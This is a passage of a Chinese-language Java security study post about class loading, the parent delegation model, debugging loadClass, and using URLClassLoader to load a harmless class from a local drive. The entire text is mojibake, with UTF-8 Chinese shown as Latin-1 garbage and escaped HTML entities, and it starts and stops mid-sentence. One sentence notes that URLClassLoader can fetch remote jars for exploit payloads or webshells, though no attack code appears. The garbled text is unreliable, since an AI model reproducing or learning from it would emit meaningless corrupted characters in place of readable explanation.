‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚ åˆå§‹åŒ– æ‰§è¡Œç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•çš„è¿‡ç¨‹\nä¼šè°ƒç”¨java.lang.ClassLoaderåŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•ï¼ˆdefineClass0/1/2ï¼‰æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Class å®ä¾‹\nå…¶ä¸­åŒ…æ‹¬ï¼š\næ‰§è¡Œstaticè¯­å¥å—ä¸­çš„è¯­å¥ å®Œæˆstaticå±æ€§çš„èµ‹å€¼æ“ä½œ å½“ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±» ClassLoaderç±»åŠ è½½å™¨åˆ†ç±» ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€ŒClassLoaderçš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚\nç±»åŠ è½½å™¨ç±»å‹åŒ…æ‹¬å››ç§ï¼Œåˆ†åˆ«å¦‚ä¸‹ï¼š\nBootstrap ClassLoaderï¼ˆå¯åŠ¨ç±»åŠ è½½å™¨ï¼‰ï¼šæœ€é¡¶å±‚çš„ç±»åŠ è½½å™¨ï¼Œä¸»è¦åŠ è½½æ ¸å¿ƒç±»åº“ã€‚è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½å­˜æ”¾åœ¨ jre\\lib ç›®å½•ä¸‹çš„éƒ¨åˆ†jaråŒ…ï¼ˆå¦‚rt.jarã€tools.jarï¼‰æˆ–è€…è¢«-Xbootclasspath å‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­å­˜æ”¾çš„ç±»åº“ã€‚ Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ï¼šè¿™ä¸ªåŠ è½½å™¨ç”±sun.misc.Launcher$ExtClassLoaderå®ç°ï¼Œå®ƒè´Ÿè´£åŠ è½½ jre\\lib\\ext ç›®å½•ä¸­çš„ï¼Œæˆ–è€…è¢« java.ext.dirs ç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“ Application ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ï¼šè¿™ä¸ªç±»åŠ è½½å™¨ç”± sun.misc.Launcher$AppClassLoader å®ç°ã€‚å®ƒè´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æŒ‡å®šçš„ç±»åº“ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹AppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚ ç”¨æˆ·è‡ªå®šä¹‰åŠ è½½å™¨ åœ¨Javaè™šæ‹Ÿæœºè§’åº¦æ¥çœ‹ï¼Œå­˜åœ¨ä¸¤ç§ä¸åŒçš„ç±»åŠ è½½å™¨ï¼š\nä¸€ç§æ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè¿™ä¸ªåŠ è½½å™¨ä½¿ç”¨C++è¯­è¨€å®ç°ï¼Œæ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†ã€‚æ‰€ä»¥å½“ä½¿ç”¨getClassLoader()æ–¹æ³•æ—¶ä¼šè¿”å›nullï¼ˆåé¢ä¼šè¯´ï¼‰\nè¿˜æœ‰ä¸€ç§æ˜¯å…¶ä»–æ‰€æœ‰çš„ç±»åŠ è½½å™¨ï¼Œè¿™äº›ç±»åŠ è½½å™¨éƒ½ç”±Javaè¯­è¨€å®ç°ï¼Œç‹¬ç«‹å­˜åœ¨äºè™šæ‹Ÿæœºå¤–éƒ¨ï¼Œå¹¶ä¸”å…¨éƒ½ç»§æ‰¿è‡ªæŠ½è±¡ç±» java.lang.ClassLoaderã€‚\nè·å–ç±»åŠ è½½å™¨çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception { // è·å– Test ç±»çš„ç±»åŠ è½½å™¨ ClassLoader testClassLoader = Class.forName(\u0026#34;Test\u0026#34;).getClassLoader(); System.out.println(\u0026#34;Test ç±»çš„ç±»åŠ è½½å™¨: \u0026#34; + testClassLoader); // è·å–å½“å‰ç±»çš„ç±»åŠ è½½å™¨ ClassLoader currentClassLoader = Main.class.getClassLoader(); System.out.println(\u0026#34;Main ç±»çš„ç±»åŠ è½½å™¨: \u0026#34; + currentClassLoader); // è·å–ç³»ç»Ÿç±»åŠ è½½å™¨ ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(\u0026#34;ç³»ç»Ÿç±»åŠ è½½å™¨: \u0026#34; + systemClassLoader); } } /* Output: Test ç±»çš„ç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 Main ç±»çš„ç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 ç³»ç»Ÿç±»åŠ è½½å™¨: sun.misc.Launcher$AppClassLoader@18b4aac2 åŒäº²å§”æ´¾æ¨¡å‹ åŒäº²å§”æ´¾æ¨¡å‹è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ã€‚æ³¨æ„è¿™é‡Œçš„çˆ¶å­å…³ç³»ä¸€èˆ¬ä¸æ˜¯ä»¥ç»§æ‰¿å…³ç³»å®ç°ï¼Œåªæ˜¯é€šè¿‡ä½¿ç”¨ç»„åˆå…³ç³»æ¥å¤ç”¨çˆ¶åŠ è½½å™¨çš„ä»£ç ã€‚\nåŒäº²å§”æ´¾æ¨¡å‹çš„å·¥ä½œæµç¨‹å›¾\nå³å¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚ï¼Œå®ƒä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œæ¯ä¸€å±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯å¦‚æ­¤ï¼Œç›´åˆ°ä¼ é€åˆ°æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚çš„æ—¶å€™ï¼ˆå³å®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»å®ŒæˆåŠ è½½ã€‚\nåŒäº²å§”æ´¾æ¨¡å‹çš„ä¼˜ç‚¹ï¼š\n1ã€è¿™æ ·å°±æ˜¯èƒ½å¤Ÿå®ç°æœ‰äº›ç±»é¿å…é‡å¤åŠ è½½ä½¿ç”¨ï¼Œç›´æ¥å…ˆç»™çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œä¸ç”¨å­åŠ è½½å™¨å†æ¬¡é‡å¤åŠ è½½ã€‚\n2ã€ä¿è¯javaæ ¸å¿ƒåº“çš„ç±»å‹å®‰å…¨ã€‚æ¯”å¦‚ç½‘ç»œä¸Šä¼ è¾“äº†ä¸€ä¸ªjava.lang.Objectç±»ï¼Œé€šè¿‡åŒäº²æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»å½“ä¸­ï¼Œç„¶åå‘ç°å…¶Objectç±»æ—©å·²è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šåŠ è½½è¿™ä¸ªç½‘ç»œä¼ è¾“è¿‡æ¥çš„java.lang.Objectç±»ï¼Œä¿è¯æˆ‘ä»¬çš„javaæ ¸å¿ƒAPIåº“ä¸è¢«ç¯¡æ”¹ï¼Œå‡ºç°ç±»ä¼¼ç”¨æˆ·è‡ªå®šä¹‰java.lang.Objectç±»çš„æƒ…å†µã€‚\nåŒäº²å§”æ´¾æ¨¡å‹å®ç°ä»£ç \nè¿™æ®µä»£ç çš„é€»è¾‘å°±æ˜¯å…ˆæ£€æŸ¥è¯·æ±‚åŠ è½½çš„ç±»å‹æ˜¯å¦è¢«åŠ è½½è¿‡ï¼Œå¦‚æœæ²¡æœ‰å°±è°ƒç”¨çˆ¶åŠ è½½å™¨çš„loadClass() æ–¹æ³•ï¼Œè‹¥çˆ¶åŠ è½½å™¨ä¸ºç©ºåˆ™é»˜è®¤ä½¿ç”¨å¯åŠ¨ç±»åŠ è½½å™¨ä¸ºçˆ¶åŠ è½½å™¨ã€‚å‡å¦‚çˆ¶åŠ è½½å™¨åŠ è½½å¤±è´¥ï¼Œæ‰è°ƒç”¨è‡ªå·±çš„findClass()æ–¹æ³•åŠ è½½ã€‚\næœ€åé€šè¿‡ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬æ‰¾åˆ°äº†å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”æ¥æ”¶åˆ°çš„resolveå‚æ•°çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±ä¼šè°ƒç”¨resolveClass(Class)æ–¹æ³•æ¥å¤„ç†ç±»ã€‚\nç±»åŠ è½½å™¨æ ¸å¿ƒæ–¹æ³• loadClassï¼šåŠ è½½æŒ‡å®šçš„Javaç±»\nfindClassï¼šæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»\nfindLoadedClassï¼šæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»\ndefineClassï¼šå®šä¹‰ä¸€ä¸ªJavaç±»\nresolveClassï¼šé“¾æ¥æŒ‡å®šçš„Javaç±»\nç±»åŠ è½½çš„æ–¹å¼ å‘½ä»¤è¡Œå¯åŠ¨åº”ç”¨æ—¶ç”±JVMåˆå§‹åŒ–åŠ è½½ é€šè¿‡Class.forName()æ–¹æ³•åŠ¨æ€åŠ è½½ é€šè¿‡ClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ã€‚ é€šè¿‡Class.forNameæ–¹æ³•åŠ¨æ€åŠ è½½ä¼šæ‰§è¡Œç±»ä¸­çš„staticå—ï¼Œè€ŒClassLoader.loadClass()æ–¹æ³•åŠ¨æ€åŠ è½½ä¸ä¼šæ‰§è¡Œ\nåœ¨å‰é¢åå°„çš„å­¦ä¹ ä¸­ä¹Ÿæ˜¯è¯´æ˜äº†å¯ä»¥åˆ©ç”¨classloaderæ¥åŠ è½½ç±»ï¼Œåœ¨è¿™é‡Œåˆ©ç”¨åŠ è½½å™¨è·å–Classå¯¹è±¡çš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ //åŠ è½½ç±»çš„Classå¯¹è±¡ï¼š Class clazz = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(\u0026#34;hello \u0026#34;+method.invoke(clazz.newInstance(),null)); } } //hello fupanc å¯ä»¥çœ‹åˆ°å¯ä»¥æ­£å¸¸è·å–åˆ°ç±»çš„Classå¯¹è±¡å¹¶ä¸”è°ƒç”¨å®ƒã€‚\nè°ƒè¯•ç±»åŠ è½½è¿‡ç¨‹ æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception{ ClassLoader classLoader = ClassLoader.getSystemClassLoader(); //åŠ è½½ç±» Class clazz = classLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); } } æ‰“æ–­ç‚¹åè°ƒè¯•ï¼š\nå¾—åˆ°å½“å‰ç±»åŠ è½½å™¨ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç„¶åå¼ºåˆ¶æ­¥å…¥loadClass()æ–¹æ³•ï¼Œè¿›å…¥åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ã€‚åœ¨è¿™ä¸ªlaodClass()æ–¹æ³•ä¸­ä¼šè°ƒç”¨å¦å¤–ä¸€ä¸ªé‡è½½çš„loadClass()æ–¹æ³•ï¼š\nç®€å•æ³¨æ„ä¸€ä¸‹è¿™ä¸ªå‚æ•°ä¼ é€’ï¼Œçœ‹çœ‹åé¢æœ‰æ²¡æœ‰ç”¨ã€‚ç»§ç»­è·Ÿè¿›è¿™ä¸ªloadClass()æ–¹æ³•,ä½†æ˜¯ç”±äºjdkè‡ªå¸¦çš„åŒ…ä¸­æœ‰äº›æ–‡ä»¶æ˜¯åç¼–è¯‘çš„.classæ–‡ä»¶ï¼Œåç¼–è¯‘çš„ä»£ç æœ‰ä¸€äº›ä¸æ˜¯å¾ˆå‡†ç¡®ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å°†å…¶è½¬æ¢ä¸º.javaæ–‡ä»¶ï¼Œå…·ä½“å°±çœ‹å‚è€ƒæ–‡ç« ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚\nç„¶åç»§ç»­è°ƒè¯•ï¼Œæ­¥å…¥åå‘ç°åˆ°è¾¾äº†Launcherç±»çš„loadClass()æ–¹æ³•ï¼š\nè¿™æ ·å°±å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„è°ƒç”¨é€»è¾‘ï¼Œä¸å¤šè¯´ï¼Œå†å¾€åé¢çœ‹ï¼Œè¿™é‡Œçš„ucp.knownToNotExist(name)ä¸ºfalseï¼Œæ‰€ä»¥ä¼šç›´æ¥è°ƒç”¨åˆ°åé¢çš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œçš„superæ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè°ƒç”¨äº†ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ï¼š\nç°åœ¨å°±åˆ°äº†ClassLoaderç±»çš„loadClass()æ–¹æ³•ï¼š è¿™é‡Œçš„é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒå¥½çœ‹ï¼Œé¦–å…ˆè¿™é‡Œçš„synchronizedæ˜¯Javaæä¾›çš„åŒæ­¥æœºåˆ¶ï¼Œç”¨äºä¿è¯å¤šçº¿ç¨‹è®¿é—®å…±äº«èµ„æºæ—¶çš„çº¿ç¨‹å®‰å…¨ï¼Œè€Œåœ¨getClassLoadingLock(name) æ–¹æ³•è¿”å›ä¸€ä¸ªç”¨äºåŠ è½½ç±»çš„é”å¯¹è±¡ï¼Œæ‰€ä»¥è¿™çš„ç›®çš„å°±æ˜¯ä¸ºæ¯ä¸ªç±»çš„åŠ è½½è¿‡ç¨‹æä¾›ç‹¬ç«‹çš„é”ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶åŠ è½½åŒä¸€ä¸ªç±»ã€‚\nç„¶åç°åœ¨æ¥çœ‹æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œé¦–å…ˆå°±æ˜¯çœ‹JVMä¸­æ˜¯å¦åŠ è½½è¿‡è¿™ä¸ªç±»ï¼Œè¿™é‡Œä¸ºnullï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åŠ è½½è¿‡ã€‚ç„¶åè¿›å…¥äº†ifè¯­å¥ï¼š\nè¿™é‡Œæ£€æµ‹åˆ°äº†ç³»ç»Ÿç±»åŠ è½½å™¨æœ‰çˆ¶åŠ è½½å™¨Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ã€‚\nç„¶åå°±è°ƒç”¨ç±»ExtClassLoaderç±»åŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼ˆåŒæ ·æ˜¯ClassLoaderç±»çš„loadClass()æ–¹æ³•ï¼‰ï¼š\nä½†æ˜¯è¿™é‡Œçš„parentä¸ºnullï¼Œä¹Ÿç®—ç¬¦åˆé¢„æœŸï¼Œå› ä¸ºæ‰©å±•ç±»åŠ è½½å™¨æœ¬æ¥å°±æ²¡æœ‰çˆ¶åŠ è½½å™¨ã€‚\nç„¶åå°±ä¼šè¿›å…¥elseè¯­å¥ï¼Œå…¶å®è¿™ä¸ªfindBootstrapClassOrNull()æ–¹æ³•å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œçš„ï¼Œè·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\nä½†æ˜¯è¿™ä¸ªfindBootstrapClass(name)æ‰§è¡Œåè¿˜æ˜¯ä¸ºNullï¼Œå›é€€åˆ°loadClass()æ–¹æ³•ï¼š\nåé¢å°±ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ï¼Œç„¶åè°ƒç”¨æ‰©å±•ç±»åŠ è½½å™¨æ¥è°ƒç”¨findClass()æ–¹æ³•æ¥æŸ¥æ‰¾ç±»ï¼š\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ä¸­æœ‰defineClass()æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰è¿›å…¥è¿™ä¸ªæ¡ä»¶ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“è¿™é‡Œå°±æ˜¯åœ¨è°ƒç”¨æ‰©å±•ç±»åŠ è½½å™¨æ¥æŸ¥æ‰¾ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰¾åˆ°ï¼Œç›´æ¥é€€å‡ºäº†ã€‚\nç„¶åå°±é€€å‡ºåˆ°äº†å‰é¢AppClassLoaderåŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼š\néšåå°±ä¼šè°ƒç”¨åˆ°AppClassLoaderç±»åŠ è½½å™¨çš„findClass()æ–¹æ³•ï¼š\nè¿™é‡Œåº”è¯¥æ˜¯å› ä¸ºå¼‚å¸¸é€€å‡ºå¯¼è‡´cç›´æ¥è¢«è®¾ç½®ä¸ºnullã€‚\nç„¶åè·Ÿè¿›è¿™é‡Œçš„findClass()æ–¹æ³•:\nå¯ä»¥çœ‹åˆ°æœ€åè¿”å›è¿™ä¸ªresultï¼Œè¿™ä¸ªresultå°±æ˜¯æˆ‘ä»¬æƒ³è¦å¯»æ‰¾çš„ç±»ã€‚å¹¶ä¸”è¿™é‡Œæ˜¯åœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨å£°æ˜çš„resultï¼Œæ‰€ä»¥è¿™ä¸ªæ‰¾ç±»çš„æ“ä½œå¿…ç„¶æ˜¯ä¸­é—´çš„é‚£ä¸ªèµ‹å€¼æ“ä½œå®Œæˆçš„ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼Œç¡®å®æ˜¯è°ƒç”¨çš„defineClass()æ–¹æ³•æ¥å®šä¹‰çš„ç±»ï¼š\næœ€åæ˜¯æ‰¾åˆ°äº†è¿™ä¸ªäº†ç±»:\nç„¶åå›åˆ°loadClass()æ–¹æ³•ï¼Œæœ€åæ˜¯ç›´æ¥è¿”å›äº†è¿™ä¸ªReflectionç±»ï¼š\nç„¶åä¸€ç›´è¿”å›ï¼ŒæˆåŠŸå¾—åˆ°äº†è¿™ä¸ªRefelctionç±»çš„Classå¯¹è±¡ï¼š\nOKã€‚è°ƒè¯•ç»“æŸã€‚å¤§æ¦‚è¿‡ç¨‹æ¢³ç†ä¸‹æ¥ç¡®å®æ¯”è¾ƒç¬¦åˆåŒäº²å§”æ´¾æœºåˆ¶ï¼Œå…ˆæ˜¯AppClassLoaderï¼Œç„¶åæ˜¯ExtClassLoaderï¼Œç„¶åæ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå¯åŠ¨ç±»åŠ è½½å™¨æ‰¾ä¸åˆ°ç„¶åå†å§”æ´¾ç»™å­åŠ è½½å™¨åŠ è½½ï¼Œæœ€ååœ¨ç³»ç»Ÿç±»åŠ è½½å™¨æ‰¾åˆ°æƒ³è¦åŠ è½½çš„ç±»ã€‚\nâ€”â€”â€”â€”\nç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹sun.misc.Launcherç±»ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­éƒ½æ˜¯è¿›å…¥äº†è¿™ä¸ªLauncherç±»çš„ï¼Œç®€å•çœ‹ä¸€ä¸‹æºç ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªç±»é‡Œé¢æœ‰å¸¸ç”¨çš„ç±»åŠ è½½å™¨çš„æºç ï¼Œçœ‹ä¸‹é¢è¿™ä¸¤ä¸ªä»£ç ï¼š\n1 2 3 static class AppClassLoader extends URLClassLoader{} static class ExtClassLoader extends URLClassLoader{} çœ‹ä¸€ä¸‹URLClassLoader\n1 public class URLClassLoader extends SecureClassLoader implements Closeable{} SecureClassLoader\n1 public class SecureClassLoader extends ClassLoader{} ä»è¿™äº›ä»£ç ç‰‡æ®µå¯ä»¥çœ‹å‡ºä¸Šé¢ä»‹ç»çš„ç±»åŠ è½½å™¨åœ¨ä½¿ç”¨æ—¶ä¸ºä»€ä¹ˆä¸æ˜¯ç»§æ‰¿å…³ç³»ï¼Œè€Œæ˜¯ç»„åˆå…³ç³»ï¼Œå«ä½œçˆ¶åŠ è½½å™¨æ˜¯ä¸ºäº†æ›´å¥½å­¦ä¹ ã€‚\nç»§æ‰¿å›¾å¦‚ä¸‹ï¼š\nURLClassLoader URLClassLoader ç»§æ‰¿äº† ClassLoaderï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºæ¥ï¼ŒURLClassLoader æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„ payload æˆ–è€… webshell çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹æ€§æ¥åŠ è½½è¿œç¨‹çš„ jar æ¥å®ç°è¿œç¨‹çš„ç±»æ–¹æ³•è°ƒç”¨ã€‚\né¦–å…ˆå£°æ˜ä¸€ç‚¹ï¼Œå¯¹äºclassæ–‡ä»¶æ˜¯å¦è¦æœ‰è½¯ä»¶åŒ…å£°æ˜é—®é¢˜ï¼ŒæŠ¥é”™çš„è¯æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š\nclassæ–‡ä»¶ä¸è¦è½¯ä»¶åŒ… è°ƒç”¨loadClass()æ–¹æ³•åŠ è½½æ—¶åŠ ä¸Šè½¯ä»¶åŒ…å³å¯ï¼Œå¦‚ java_foundation.Reflection â€”â€”â€”â€”â€”â€”\nMyTest.javaï¼š\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•°\u0026#34;); } } javacç¼–è¯‘ç”ŸæˆMyTest.classæ–‡ä»¶ï¼Œå†å°†å…¶æ”¾åœ¨Eç›˜ã€‚ç„¶åå°†å½“å‰é¡¹ç›®ä¸­çš„æ‰€æœ‰MyTest.javaæ–‡ä»¶åˆ é™¤ï¼ŒåŒæ—¶æ³¨æ„classpathä¸­å·²ç¼–è¯‘çš„MyTest.classæ–‡ä»¶ï¼Œä¹Ÿè¦åˆ é™¤ï¼Œç„¶åä½¿ç”¨å¦‚ä¸‹ä»£ç æµ‹è¯•ï¼š\nMain.javaæ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } è¾“å‡ºç»“æœï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@7a81197d MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºsun.misc.Launcher$AppClassLoader@14dad5dc è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨çš„æ˜¯URLClassLoaderæ„é€ å™¨ï¼Œå¹¶ä¸”è¿™ä¸ªæ„é€ å™¨çš„çˆ¶åŠ è½½å™¨æ˜¯AppClassLoaderåŠ è½½å™¨ã€‚äº†å¤§æ¦‚è¯´ä¸€ä¸‹è¿™é‡Œçš„é€»è¾‘ï¼Œå…ˆç”¨Fileç±»æ¥å®šä¹‰äº†ä¸€ä¸ªåœ¨Dç›˜ä¸‹æœç´¢æ–‡ä»¶çš„Fileå¯¹è±¡ã€‚\nç„¶åè°ƒç”¨äº†toURI().toURL()å‡½æ•°æ¥å°†Fileå¯¹è±¡è½¬æ¢ä¸ºURLï¼Œå› ä¸ºURLæ˜¯URLClassLoaderç”¨æ¥å®šä½èµ„æºçš„æ ¼å¼ã€‚è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªURLç±»å‹çš„æ•°ç»„ï¼Œæ˜¯URLClassLoaderç±»çš„æ„é€ å‡½æ•°å†³å®šçš„ï¼š\nç„¶åå°±æ˜¯åŠ è½½ç±»é‚£äº›äº†ï¼Œä¸å¤šè¯´ã€‚\nä½†æ˜¯å¦‚æœclasspathä¸­æœ‰ç›¸å…³è¿œç¨‹åŠ è½½ç±»çš„ç¼–è¯‘ä»£ç ï¼Œæ­¤æ—¶AppClassLoaderå°±ä¼šä¼˜å…ˆåŠ è½½è¿™ä¸ªæœ¬åœ°classæ–‡ä»¶ï¼Œè€Œä¸ä¼šå»åŠ è½½Eç›˜çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å°è¯•;\nå¦å¤–çš„MyTest.javaæ–‡ä»¶å†…å®¹ï¼š\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†classPathä¸­çš„MyTestæ–‡ä»¶\u0026#34;); } } ç„¶åæˆ‘å°†å…¶æ‰“æˆjaråŒ…åŠ å…¥åˆ°å½“å‰mavené¡¹ç›®çš„å¤–éƒ¨åº“ä¸­ï¼Œä¹Ÿå°±æ˜¯å¼•å…¥äº†classpathä¸­ï¼Œå†ä½¿ç”¨ä¹‹å‰çš„ä»£ç é‡Œæ¥æµ‹è¯•ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºsun.misc.Launcher$AppClassLoader@14dad5dc MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºsun.misc.Launcher$ExtClassLoader@2f92e0f4 è°ƒç”¨äº†classPathä¸­çš„MyTestæ–‡ä»¶ å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯ä¼˜å…ˆè°ƒç”¨çš„classpathä¸­çš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å†è°ƒç”¨URLä¸­å¼•å…¥çš„æ–‡ä»¶ã€‚\nä½†æ˜¯è¿™é‡ŒåŒæ ·æ˜¯æœ‰è§£å†³æ–¹æ³•çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†URLClassLoaderçš„çˆ¶ç±»è®¾ç½®ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè¿™æ ·åœ¨åŒäº²å§”æ´¾æ—¶å°±å¯ä»¥é¿å…AppClassLoaderåŠ è½½classpathä¸­çš„æ–‡ä»¶ï¼Œè€Œæ˜¯URLClassLoaderä¼˜å…ˆåŠ è½½ã€‚\næµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = 